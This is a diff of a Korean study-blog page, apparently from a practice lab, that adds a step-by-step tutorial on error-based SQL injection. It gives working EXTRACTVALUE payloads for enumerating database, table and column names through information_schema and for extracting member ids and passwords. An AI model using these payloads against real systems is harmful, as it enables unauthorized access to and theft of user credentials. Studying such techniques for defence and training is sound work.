@@ -219,7 +219,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-clock" aria-hidden="true"></i>
         
-          2 분 소요
+          3 분 소요
         
       </span>
     
@@ -234,7 +234,7 @@
           <aside class="sidebar__right sticky">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-fas fa-laptop-code"></i> 목차</h4></header>
-              <ul class="toc__menu"><li><a href="#1-sql-injection-데이터-추출3">1. SQL injection 데이터 추출(3)</a><ul><li><a href="#11-개요">1.1 개요 </a></li><li><a href="#12-error-based-sql-injection에러-메세지를-출력하여-화면에서-볼-수-있을때">1.2  Error Based SQL Injection(에러 메세지를 출력하여 화면에서 볼 수 있을때)</a><ul><li><a href="#121-필요한-개념">1.2.1 필요한 개념</a></li><li><a href="#122">1.2.2</a></li></ul></li></ul></li></ul>
+              <ul class="toc__menu"><li><a href="#1-sql-injection-데이터-추출3">1. SQL injection 데이터 추출(3)</a><ul><li><a href="#11-개요">1.1 개요 </a></li><li><a href="#12-error-based-sql-injection에러-메세지를-출력하여-화면에서-볼-수-있을때">1.2  Error Based SQL Injection(에러 메세지를 출력하여 화면에서 볼 수 있을때)</a><ul><li><a href="#121-필요한-개념">1.2.1 필요한 개념</a></li><li><a href="#122-데이터-추출의-과정에러-메세지를-화면으로-볼-수-있을-때">1.2.2 데이터 추출의 과정(에러 메세지를 화면으로 볼 수 있을 때)</a><ul><li><a href="#1221-sql-injection-포인트-찾기">1.2.2.1 sql injection 포인트 찾기</a></li><li><a href="#1222--에러-출력-함수">1.2.2.2  에러 출력 함수</a></li><li><a href="#1223-공격-format-만들기">1.2.2.3 공격 format 만들기</a></li><li><a href="#1224-db이름-확인하기">1.2.2.4 DB이름 확인하기</a></li><li><a href="#1225-table이름-확인하기">1.2.2.5 table이름 확인하기</a></li><li><a href="#1226-column-이름-확인하기">1.2.2.6 column 이름 확인하기</a></li><li><a href="#1227-data-추출하기">1.2.2.7 data 추출하기</a></li></ul></li></ul></li></ul></li></ul>
 
             </nav>
           </aside>
@@ -270,7 +270,7 @@
 
 <p><br /></p>
 
-<p>이번 포스팅에서는 2, 3 번을 배워보도록 합시다.</p>
+<p>이번 포스팅에서는 2 번을 배워보도록 합시다.</p>
 
 <p><br /></p>
 
@@ -278,7 +278,7 @@
 
 <p><br /></p>
 
-<h3 id="121-필요한-개념">1.2.1 필요한 개념</h3>
+<h3 id="121-필요한-개념"><span style="background:#909090; color:#ffffff">1.2.1 필요한 개념</span></h3>
 
 <hr />
 
@@ -399,9 +399,182 @@ concat(‘0x3a’, ‘test’) ——&gt; :test</p>
 
 <p><br /></p>
 
-<h3 id="122">1.2.2</h3>
+<p><br /></p>
+
+<h3 id="122-데이터-추출의-과정에러-메세지를-화면으로-볼-수-있을-때"><span style="background:#909090; color:#ffffff">1.2.2 데이터 추출의 과정<span style="font-size:50%">(에러 메세지를 화면으로 볼 수 있을 때)</span></span></h3>
 
 <hr />
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:20px">〈 Error Based 이용한 sql injection pocess 〉</span></p>
+
+<p><br /></p>
+
+<p><span style="font-weight:bold; font-size:15px">1. sql injection 포인트 찾기 (sql injection이 가능한지 확인하고, 어떤 로직으로 구성했을까? 예측하기)</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">2. 에러 출력 함수</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">3. 공격 format 만들기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">4. DB이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">5. table이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">6. column 이름 확인하기</span></p>
+
+<p><span style="font-weight:bold; font-size:15px">7. data 추출하기</span></p>
+
+<p>예제에 따라 해당 절차를 시행해보면서 설명해보겠습니다.</p>
+
+<p><br /></p>
+
+<h4 id="1221-sql-injection-포인트-찾기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.1 sql injection 포인트 찾기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>기본적으로 Error Based SQLi를 적용하려면 SQL 에러를 화면에 출력 되어야 하므로,</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601094626149.png" alt="image-20240601094626149" style="zoom:50%;" /></p>
+
+<p>SQL에러 와 관련된 에러가 발생하는지 확인한다.</p>
+
+<p><br /></p>
+
+<h4 id="1222--에러-출력-함수"><span style="background:#A9A9A9; color:#ffffff">1.2.2.2  에러 출력 함수</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>(대표적)<strong><code class="language-plaintext highlighter-rouge">EXTRACTVALUE()</code></strong>
+or <strong><code class="language-plaintext highlighter-rouge">CAST()</code></strong>와<strong><code class="language-plaintext highlighter-rouge">CONVERT()</code></strong> 등을 이용.</p>
+
+<p><br /></p>
+
+<h4 id="1223-공격-format-만들기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.3 공격 format 만들기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(select ‘test’))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601100910338.png" alt="image-20240601100910338" style="zoom:67%;" /></p>
+
+<p>문법 에러가 나타나지 않으면서, 로직 에러가 나타나는 것 까지 확인 했습니다!</p>
+
+<p><br /></p>
+
+<p>따라서</p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1</p>
+
+<p>이와 같이 select 부분만 바꿔서 계속 쓸 수 있도록 공격 format을 만들 수 있습니다.</p>
+
+<p><br /></p>
+
+<h4 id="1224-db이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.4 DB이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>DB 이름 확인하는 법은 <br />
+select database() 이므로, <br />
+<br /></p>
+
+<p>공격 format <br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다. <br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select database() limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601101741238.png" alt="image-20240601101741238" style="zoom:67%;" /></p>
+
+<p><br /></p>
+
+<h4 id="1225-table이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.5 table이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>table 이름 확인하는 법은<br />
+select table_name from information_schema.tables where table_schema=’DB name’ limit 0,1 이므로, <br />
+<br /></p>
+
+<p>공격 format<br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다. <br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select table_name from information_schema.tables where table_schema=’segfault_sql’ limit 0,1 </span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102131068.png" alt="image-20240601102131068" style="zoom:67%;" />[limit 0,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102219083.png" alt="image-20240601102219083" style="zoom:67%;" />[limit 1,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102338714.png" alt="image-20240601102338714" style="zoom:67%;" />[limit 2,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102414956.png" alt="image-20240601102414956" style="zoom:67%;" />[limit 3,1]</p>
+
+<p><br /></p>
+
+<h4 id="1226-column-이름-확인하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.6 column 이름 확인하기</span></h4>
+
+<hr />
+<p><br /></p>
+
+<p>column 이름 확인하는 법은<br />
+select column_name from information_schema.columns where table_name=’table name’ limit 0,1 이므로, <br />
+<br /></p>
+
+<p>공격 format<br />
+‘ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select~~</span>))) and ‘1’=’1<br />
+에 대입한다.<br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select column_name from information_schema.columns where table_name=’member’ limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102826831.png" alt="image-20240601102826831" style="zoom:67%;" />[limit 0,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102900086.png" alt="image-20240601102900086" style="zoom:67%;" />[limit 1,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601102928085.png" alt="image-20240601102928085" style="zoom:67%;" />[limit 2,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103001659.png" alt="image-20240601103001659" style="zoom:67%;" />[limit 3,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103026201.png" alt="image-20240601103026201" style="zoom:67%;" />[limit 4,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103053717.png" alt="image-20240601103053717" style="zoom:67%;" />[limit 5,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103136119.png" alt="image-20240601103136119" style="zoom:67%;" />[limit 6,1]</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103203656.png" alt="image-20240601103203656" style="zoom:67%;" />[limit 7,1]</p>
+
+<p>이런 식으로 컬럼을 알 수 있다.</p>
+
+<p><br /></p>
+
+<h4 id="1227-data-추출하기"><span style="background:#A9A9A9; color:#ffffff">1.2.2.7 data 추출하기</span></h4>
+
+<hr />
+
+<p><br /></p>
+
+<p>같은 방식으로 <br />
+select flag from flagTable limit 0,1<br />
+<br /></p>
+
+<p>’ and extractvalue(‘1’,concat(0x3a,(<span style="font-weight:bold; color: orange">select id from member limit 0,1</span>))) and ‘1’=’1</p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103508970.png" alt="image-20240601103508970" style="zoom:67%;" /></p>
+
+<p><img src="/images/2024-06-01-SQLinjection15/image-20240601103530142.png" alt="image-20240601103530142" style="zoom:67%;" /></p>
+
+<p>doldol의 아이디와 비밀번호를 알 수 있습니다.</p>
+
+<p><br /></p>
+
 
         
       </section>
@@ -452,7 +625,8 @@ concat(‘0x3a’, ‘test’) ——&gt; :test</p>
 ">이전</a>
     
     
-      <a href="#" class="pagination--pager disabled">다음</a>
+      <a href="/sql-injection/SQLinjection16/" class="pagination--pager" title="SQL injection 데이터 추출(4)
+">다음</a>
     
   </nav>
 
@@ -466,6 +640,53 @@ concat(‘0x3a’, ‘test’) ——&gt; :test</p>
     <div class="page__related">
       <h2 class="page__related-title">참고</h2>
       <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/sql-injection/SQLinjection16/" rel="permalink">SQL injection 데이터 추출(4)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-06-01T00:00:00+09:00">2024-06-01</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 분 소요
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
         
           
 
@@ -571,53 +792,6 @@ concat(‘0x3a’, ‘test’) ——&gt; :test</p>
     <h2 class="archive__item-title no_toc" itemprop="headline">
       
         <a href="/sql-injection/SQLinjection7/" rel="permalink">5주차 SQL injection 인증우회 문제풀이(3)
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-05-29T00:00:00+09:00">2024-05-29</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          최대 1 분 소요
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">
-</p>
-  </article>
-</div>
-
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/sql-injection/SQLinjection6/" rel="permalink">5주차 SQL injection 인증우회 문제풀이(2)
 </a>
       
     </h2>
